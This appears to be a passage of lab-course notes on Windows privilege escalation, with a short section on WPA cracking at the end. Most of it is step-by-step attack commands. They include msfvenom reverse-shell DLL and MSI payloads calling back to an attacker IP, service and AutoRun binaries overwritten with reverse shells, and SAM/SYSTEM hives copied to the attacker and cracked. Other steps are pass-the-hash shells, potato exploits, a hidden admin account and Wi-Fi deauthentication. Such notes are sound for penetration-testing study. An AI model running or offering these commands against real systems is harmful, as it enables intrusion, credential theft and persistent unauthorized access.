
Consider the following unquoted path:
C:\Program Files\Some Dir\SomeProgram.exe
To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be
the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe”
Windows resolves this ambiguity by checking each of the possibilities in turn.
If we can write to a location Windows checks before the actual executable, we
can trick the service into executing it instead.

### Privilege Escalation
1. Run winPEAS to check for service misconfigurations:
```
.\winPEASany.exe quiet servicesinfo
```
2. Note that the `unquotedsvc` service has an unquoted path that also contains spaces: `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
3. Confirm this using sc:
```
sc qc unquotedsvc
```
4. Use accesschk.exe to check for write permissions:
```
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
5. Copy the reverse shell executable and rename it appropriately:
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
6. Start a listener on Kali, and then start the service to trigger the exploit:
```
net start unquotedsvc
```
## Weak Registry Permissions

The Windows registry stores entries for each service.

Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

### Privilege Escalation
1. Run winPEAS to check for service misconfigurations:
```
.\winPEASany.exe quiet servicesinfo
```
2. Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell:
```
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```
3. Alternatively accesschk.exe can be used to confirm:
```
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```
4. Overwrite the ImagePath registry key to point to our reverse shell executable:
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
5. Start a listener on Kali, and then start the service to trigger the exploit:
```
net start regsvc
```

## Insecure Service Executables
If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable.
Remember to create a backup of the original executable if you are exploiting this in a real system!

### Privilege Escalation
1. Run winPEAS to check for service misconfigurations:
```
.\winPEASany.exe quiet servicesinfo
```
2. Note that the “filepermsvc” service has an executable which appears to be
writable by everyone. We can confirm this with accesschk.exe:
```
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
3. Create a backup of the original service executable:
```
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
```
4. Copy the reverse shell executable to overwrite the service executable:
```
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```
5. Start a listener on Kali, and then start the service to trigger the
exploit:
```
net start filepermsvc
```

## DLL Hijacking
Often a service will try to load functionality from a library called a DLL (dynamic-link library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it.

If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in.

Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual.

### Privilege Escalation
1. Use winPEAS to enumerate non-Windows services:
```
.\winPEASany.exe quiet servicesinfo
```
2. Note that the C:\Temp directory is writable and in the PATH. Start by
enumerating which of these services our user has stop and start access to:
```
.\accesschk.exe /accepteula -uvqc user dllsvc
```
3. The “dllsvc” service is vulnerable to DLL Hijacking. According to the
winPEAS output, the service runs the dllhijackservice.exe executable. We
can confirm this manually:
```
sc qc dllsvc
```
4. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.
5. Add a new filter on the Process Name matching dllhijackservice.exe.
6. On the main screen, deselect registry activity and network activity.
7. Start the service:
```
net start dllsvc
```
8. Back in Procmon, note that a number of “NAME NOT
FOUND” errors appear, associated with the hijackme.dll file.
9. At some point, Windows tries to find the file in the C:\Temp
directory, which as we found earlier, is writable by our user.
10. On Kali, generate a reverse shell DLL named hijackme.dll:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
```
11.  Copy the DLL to the Windows VM and into the C:\Temp directory. Start a
listener on Kali and then stop/start the service to trigger the exploit:
```
net stop dllsvc
net start dllsvc
```

# Registry Exploits

## AutoRuns

Windows can be configured to run commands at startup, with elevated privileges.

These “AutoRuns” are configured in the Registry.

If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.

### Privilege Escalation
1. Use winPEAS to check for writable AutoRun executables:
```
.\winPEASany.exe quiet applicationsinfo
```
2. Alternatively, we could manually enumerate the AutoRun executables:
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
and then use accesschk.exe to verify the permissions on each one:
```
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```
3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:
```
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```
4. Copy our reverse shell executable to overwrite the AutoRun executable:
```
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
```
5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.

## AlwaysInstallElevated

MSI files are package files used to install applications.
These files run with the permissions of the user trying to install them.
Windows allows for these installers to be run with elevated (i.e. admin) privileges.
If this is the case, we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work.
The `AlwaysInstallElevated` value must be set to 1 for both the local
machine: `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
and the current user: `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
If either of these are missing or disabled, the exploit will not work.

### Privilege Escalation
1. Use winPEAS to see if both registry values are set:
```
.\winPEASany.exe quiet windowscreds
```
2. Alternatively, verify the values manually:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
3. Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
```
4. Copy the reverse.msi across to the Windows VM, start a listener on Kali,
and run the installer to trigger the exploit:
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

# Windows Subsystem for Linux

```
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
wsl.exe whoami
./ubuntu1604.exe config --default-user root
wsl.exe whoami
wsl.exe python -c 'reverse shell'
```

# Bad Password Practices

Even administrators re-use their passwords, or leave their passwords on systems in readable locations.
Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.

## Searching the Registry for Passwords

The following commands will search the registry for keys and values that contain “password”
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
This usually generates a lot of results, so often it is more fruitful to look in known locations.

### Privilege Escalation
1. Use winPEAS to check common password locations:
```
.\winPEASany.exe quiet filesinfo userinfo
```
2. The results show both AutoLogon credentials and Putty session credentials for the admin user (admin/password123).
1. We can verify these manually:
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```
4. On Kali, we can use the winexe command to spawn a shell using these credentials:
```
winexe -U 'admin%password123' //192.168.1.22 cmd.exe
```

## Saved Creds
Windows has a runas command which allows users to run commands with the privileges of other users.
This usually requires the knowledge of the other user’s password.
However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.

### Privilege Escalation
1. Use winPEAS to check for saved credentials:
```
.\winPEASany.exe quiet cmd windowscreds
```
2. It appears that saved credentials for the admin user exist.
3. We can verify this manually using the following command:
```
cmdkey /list
```
4. If the saved credentials aren’t present, run the following script to refresh the credential:
```
C:\PrivEsc\savecred.bat
```
5. We can use the saved credential to run any command as the admin
user. Start a listener on Kali and run the reverse shell executable:
```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

## Configuration Files
Some administrators will leave configurations files on the system with passwords in them.
The Unattend.xml file is an example of this.
It allows for the largely automated setup of Windows systems.

## Searching for Configuration Files
Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:
```
dir /s *pass* == *.config
```
Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:
```
findstr /si password *.xml *.ini *.txt
```

### Privilege Escalation
1. Use winPEAS to search for common files which may
contain credentials:
```
.\winPEASany.exe quiet cmd searchfast filesinfo
```
2. The Unattend.xml file was found. View the contents:
```
type C:\Windows\Panther\Unattend.xml
```
3. A password for the admin user was found. The password is Base64 encoded: cGFzc3dvcmQxMjM=
4. On Kali we can easily decode this:
```
echo "cGFzc3dvcmQxMjM=" | base64 -d
```
5. Once again we can simply use winexe to spawn a shell as
the admin user.

## SAM
Windows stores password hashes in the Security Account Manager (SAM).

The hashes are encrypted with a key which can be found in a file named SYSTEM.

If you have the ability to read the SAM and SYSTEM files, you can extract the hashes.

## SAM/SYSTEM Locations
The SAM and SYSTEM files are located in the `C:\Windows\System32\config` directory.
The files are locked while Windows is running.
Backups of the files may exist in the `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack` directories.

### Privilege Escalation
1. Backups of the SAM and SYSTEM files can be found in
`C:\Windows\Repair` and are readable by our user.
2. Copy the files back to Kali:
```
copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
```
3. Download the latest version of the creddump suite:
```
git clone https://github.com/Neohapsis/creddump7.git
```
4. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
```
python2 creddump7/pwdump.py SYSTEM SAM
```
5. Crack the admin user hash using hashcat:
```
hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```

## Passing the Hash
Windows accepts hashes instead of passwords to authenticate to a number of services.

We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user’s hash.

### Privilege Escalation
1. Extract the admin hash from the SAM in the previous step.
2. Use the hash with pth-winexe to spawn a command prompt:
```
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
```
3. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
```
pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
```

# Scheduled Tasks

Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon).
Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.

## Commands
Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account.
List all scheduled tasks your user can see:
```
schtasks /query /fo LIST /v
```
In PowerShell:
```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.

### Privilege Escalation
1. In the C:\DevTools directory, there is a PowerShell script called “CleanUp.ps1”. View the script:
```
type C:\DevTools\CleanUp.ps1
```
2. This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:
```
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```
3. Backup the script:
```
copy C:\DevTools\CleanUp.ps1 C:\Temp\
```
4. Start a listener on Kali.
5. Use echo to append a call to our reverse shell executable to the end of the script:
```
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```
6. Wait for the scheduled task to run (it should run every minute) to complete the exploit.

# Insecure GUI Apps (Citrix Method)

On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges.

There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality.

Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges.

I call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.

### Privilege Escalation
1. Log into the Windows VM using the GUI with the “user” account.
2. Double click on the “AdminPaint” shortcut on the Desktop.
3. Open a command prompt and run:
```
tasklist /V | findstr mspaint.exe
```
4. In Paint, click File, then Open.
5. In the navigation input, replace the contents with:
file://c:/windows/system32/cmd.exe
6. Press Enter. A command prompt should open running with admin privileges.

# Startup Apps

Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory.

Windows also has a startup directory for apps that should start for all users:
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

Note that shortcut files (.lnk) must be used. The following VBScript can be used
to create a shortcut file:
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

## Privilege Escalation
1. Use accesschk.exe to check permissions on the StartUp
directory:
```
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
2. Note that the BUILTIN\Users group has write access to
this directory.
3. Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.
4. Run the script using cscript:
```
cscript CreateShortcut.vbs
```
5. Start a listener on Kali, then log in as the admin user to
trigger the exploit.

# Installed Applications

Most privilege escalations relating to installed applications are based on misconfigurations we have already covered.

Still, some privilege escalations results from things like buffer overflows, so knowing how to identify installed applications and known vulnerabilities is still important.

## Commands
Manually enumerate all running programs:
```
tasklist /v
```
We can also use Seatbelt to search for nonstandard
processes:
```
.\seatbelt.exe NonstandardProcesses
```
winPEAS also has this ability (note the misspelling):
```
.\winPEASany.exe quiet procesinfo
```
## Exploit-DB

Once you find an interesting process, try to identify its version. You can try running the executable with /? or -h, as well as checking config or text files in the Program Files directory.

Use Exploit-DB to search for a corresponding exploit. Some exploits contain instructions, while others are code that you will need to compile and run.

# Hot Potato

Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges.

The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.

This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.

## Privilege Escalation
1. Copy the potato.exe exploit executable over to Windows.
2. Start a listener on Kali.
3. Run the exploit:
```
.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```
4. Wait for a Windows Defender update, or trigger one manually.


# Service Accounts (Rotten / Juicy Potato)

We briefly talked about service accounts at the start of the course.
Service accounts can be given special privileges in order for them
to run their services, and cannot be logged into directly.
Unfortunately, multiple problems have been found with service
accounts, making them easier to escalate privileges with.

## Rotten Potato

The original Rotten Potato exploit was identified in 2016.

Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user.

This was possible because service accounts usually have the `SeImpersonatePrivilege` privilege enabled.

## Juicy Potato

Rotten Potato was quite a limited exploit.

Juicy Potato works in the same way as Rotten Potato, but the authors did extensive research and found many more ways to exploit.

https://github.com/ohpe/juicy-potato

### Privilege Escalation
1. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to
Windows.
2. Start a listener on Kali.
3. Using an administrator command prompt, use PSExec64.exe to trigger a
reverse shell running as the Local Service service account:
```
C:\PrivEsc\PSExec64.exe -i -u "ntauthority\local service" C:\PrivEsc\reverse.exe
```
4. Start another listener on Kali.
5. Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
```
C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d49b8-abc6-03dd84127020}
```
6. If the CLSID ({03ca…) doesn’t work for you, either check this list: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md or run the GetCLSID.ps1 PowerShell script.

# Port Forwarding

Sometimes it is easier to run exploit code on Kali, but the vulnerable program is listening on an internal port.

In these cases we need to forward a port on Kali to the internal port on Windows.

We can do this using a program called plink.exe (from the makers of PuTTY).

## plink.exe
The general format of a port forwarding command using
plink.exe:
```
plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>
```

Note that the \<target-IP\> is usually local (e.g. 127.0.0.1).

plink.exe requires you to SSH to Kali, and then uses the SSH tunnel to forward ports.

### Privilege Escalation
1. First, test that we can still login remotely via winexe:
```
winexe -U 'admin%password123' //192.168.1.22 cmd.exe
```
2. Using an administrator command prompt, re-enable the firewall:
```
netsh advfirewall set allprofiles state on
```
3. Confirm that the winexe command now fails.
4. Copy the plink.exe file across to Windows, and then kill the SMB Server on Kali (if you are using it).
5. Make sure that the SSH server on Kali is running and accepting root logins. Check that the “PermitRootLogin yes” option is uncommented in /etc/ssh/sshd_config. Restart the SSH service if necessary.
6. On Windows, use plink.exe to forward port 445 on Kali to the Windows port 445:
```
plink.exe root@192.168.1.11 -R 445:127.0.0.1:445
```
7. On Kali, modify the winexe command to point to localhost (or 127.0.0.1) instead, and execute it to get a shell via the port forward:
```
winexe -U 'admin%password123' //localhost cmd.exe
```

# getsystem (Named Pipes & Token Duplication)
Access Tokens are special objects in Windows which store a user’s identity and privileges.

Primary Access Token – Created when the user logs in, bound to the current user session. When a user starts a new process, their primary access token is copied and attached to the new process.

Impersonation Access Token – Created when a process or thread needs to temporarily run with the security context of another user.

## Token Duplication
Windows allows processes/threads to duplicate their access tokens.

An impersonation access token can be duplicated into a primary access token this way.

If we can inject into a process, we can use this functionality to duplicate the access token of the process, and spawn a separate process with the same privileges.

## Named Pipes
You may be already familiar with the concept of a “pipe” in Windows & Linux:
```
systeminfo | findstr Windows
```
A named pipe is an extension of this concept.
A process can create a named pipe, and other processes can open the named pipe to read or write data from/to it.
The process which created the named pipe can impersonate the security context of a process which connects to the named pipe.

## getsystem
The “getsystem” command in Metasploit’s Meterpreter shell has an almost mythical status.

By running this simple command, our privileges are almost magically elevated to that of the SYSTEM user.

What does it actually do?

The source code for the getsystem command can be found here: https://github.com/rapid7/metasploitpayloads/tree/d672097e9989e0b4caecfad08ca9debc8e50bb0c/c/meterpreter/source/extensions/priv

Three files are worth looking through: elevate.c, namedpipe.c, and tokendup.c

There are 3 techniques getsystem can use to `get system`.

### Named Pipe Impersonation (In Memory/Admin)
Creates a named pipe controlled by Meterpreter.

Creates a service (running as SYSTEM) which runs a command that interacts directly with the named pipe.

Meterpreter then impersonates the connected process to get an impersonation access token (with the SYSTEM security context).

The access token is then assigned to all subsequent Meterpreter threads, meaning they run with SYSTEM privileges.

### Named Pipe Impersonation (Dropper/Admin)
Very similar to Named Pipe Impersonation (In Memory/Admin).

Only difference is a DLL is written to disk, and a service created which runs the DLL as SYSTEM.

The DLL connects to the named pipe.

### Token Duplication (In Memory/Admin)
This technique requires the “SeDebugPrivilege”.

It finds a service running as SYSTEM which it injects a DLL into. The DLL duplicates the access token of the service and assigns it to Meterpreter.

Currently this only works on x86 architectures.

This is the only technique that does not have to create a service, and
operates entirely in memory.

## Summary
getsystem was designed as a tool to escalate privileges from a local admin to SYSTEM.

The Named Pipe techniques require local admin permissions.

The Token Duplication technique only requires the SeDebugPrivilege privilege, but is also limited to x86 architectures.

getsystem should not be thought of as a user -> admin privilege escalation method in modern systems.

# User Privileges
In Windows, user accounts and groups can be assigned specific “privileges”.

These privileges grant access to certain abilities.

Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.

Highly detailed paper: https://github.com/hatRiot/token-priv

## Listing our Privileges
The whoami command can be used to list our user’s privileges, using the /priv option:
```
whoami /priv
```
Note that `disabled` in the state column is irrelevant here. If the privilege is listed, your user has it.

## SeImpersonatePrivilege
The SeImpersonatePrivilege grants the ability to impersonate any access tokens which it can obtain.

If an access token from a SYSTEM process can be obtained, then a new process can be spawned using that token.

The Juicy Potato exploit in a previous section abuses this ability.

## SeAssignPrimaryPrivilege
The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege.
It enables a user to assign an access token to a new process.
Again, this can be exploited with the Juicy Potato exploit.

## SeBackupPrivilege
The SeBackupPrivilege grants read access to all objects on the system, regardless of their ACL.
Using this privilege, a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.

## SeRestorePrivilege
The SeRestorePrivilege grants write access to all objects on the system, regardless of their ACL.
There are a multitude of ways to abuse this privilege:
* Modify service binaries.
* Overwrite DLLs used by SYSTEM processes
* Modify registry settings.

## SeTakeOwnershipPrivilege
The SeTakeOwnershipPrivilege lets the user take ownership over an object (the WRITE_OWNER permission).
Once you own an object, you can modify its ACL and grant yourself write access.
The same methods used with SeRestorePrivilege then apply.

## Other Privileges (More Advanced)
* SeTcbPrivilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeDebugPrivilege (used by getsystem)

# Privilege Escalation Strategy

## Enumeration
1. Check your user (whoami) and groups (net user \<username>)
2. Run winPEAS with fast, searchfast, and cmd options.
3. Run Seatbelt & other scripts as well!
4. If your scripts are failing and you don’t know why, you can always run the manual commands from this course, and other Windows PrivEsc cheatsheets online (e.g. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Method ology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

## Strategy
1. Spend some time and read over the results of your enumeration.
   
2. If WinPEAS or another tool finds something interesting, make a note of it.
  
3. Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.
   
4. Have a quick look around for files in your user’s desktop and other common locations (e.g. C:\ and C:\Program Files).
   
5. Read through interesting files that you find, as they may contain useful information that could help escalateprivileges.
   
6. Try things that don’t have many steps first, e.g. registry exploits, services, etc.
   
7. Have a good look at admin processes, enumerate their versions and search for exploits.
   
8. Check for internal ports that you might be able to forward to your attacking machine.
   
9.  If you still don’t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.
    
10. This might be a process or file name you aren’t familiar with or even a username.
    
11. At this stage you can also start to think about Kernel Exploits.
# Creating user with RDP privileges

```
net user USER PASS /add
net localgroup Administrators USER /add
net localgroup "Remote Management Users" USER /add
```
# Wireless attacks

## WPA cracking

### Wifite

```
sudo wifite -wpa -mac --skip-crack --wpat 60 --wpadt 10 --no-wps

# more info
https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2

# converting from handshake to crackable hash
https://hashcat.net/cap2hccapx/

.\hashcat64.exe -m 2500 .\handshakes\? ..\..\wordlists\rockyouplus.wordlist
```

### Aircrack-ng

```
airmon-ng start <interface>
airodump-ng <interface>
airodump-ng --bssid <bssid> -c <channel> --write <out> <interface>
aireplay-ng --deauth 10 -a <bssid of AP> <interface>
aircrack-ng <cap file> -w <wordlist>
```

